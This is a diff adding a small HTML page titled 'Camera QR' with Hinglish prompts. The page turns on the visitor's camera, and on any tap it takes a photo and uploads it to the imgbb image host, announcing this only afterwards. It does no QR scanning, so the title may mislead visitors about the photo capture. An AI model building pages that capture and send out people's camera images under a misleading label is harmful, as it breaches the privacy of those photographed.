@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Camera QR</title>
+</head>
+<body style="text-align:center">
+
+<h2>Screen par tap karo</h2>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => video.srcObject = stream)
+    .catch(() => alert("Camera allow karo"));
+
+  document.body.onclick = () => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+
+    canvas.toBlob(blob => {
+      const formData = new FormData();
+      formData.append("image", blob);
+
+      fetch("https://api.imgbb.com/1/upload?key=YOUR_API_KEY", {
+        method: "POST",
+        body: formData
+      }).then(() => {
+        alert("Photo Upload Ho Gayi ✅");
+      });
+    });
+  };
+</script>
+
+</body>
+</html>
